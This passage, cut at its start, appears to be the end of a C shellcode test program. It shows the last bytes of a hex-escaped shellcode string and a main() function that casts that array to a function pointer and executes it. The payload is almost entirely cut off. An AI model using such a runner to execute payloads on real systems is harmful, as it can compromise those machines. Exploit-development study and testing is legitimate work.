"\x73\x69\x6f\x6e\x20\x24\x61\x22"


;

int main()
	{ 
	    // printf("Shellcode length: %d\n", (int)strlen(shellcode));
	     
	    (*(void(*)(void))&shellcode)();
	 
	    return 0;
	}

	
